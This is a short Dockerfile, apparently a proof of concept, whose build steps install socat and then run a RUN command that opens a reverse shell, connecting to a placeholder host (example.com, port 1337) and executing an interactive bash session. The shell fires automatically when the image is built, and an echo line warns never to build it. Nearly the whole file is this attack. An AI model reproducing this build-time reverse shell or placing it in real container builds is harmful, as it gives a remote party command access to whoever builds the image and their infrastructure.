FROM ubuntu

ENV POC_HOST example.com
ENV POC_PORT 1337

RUN echo "Please NEVER build this image!"

RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y socat curl && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

RUN socat tcp-connect:$POC_HOST:$POC_PORT exec:'bash -li',pty,stderr,setsid,sigint,sane

CMD bash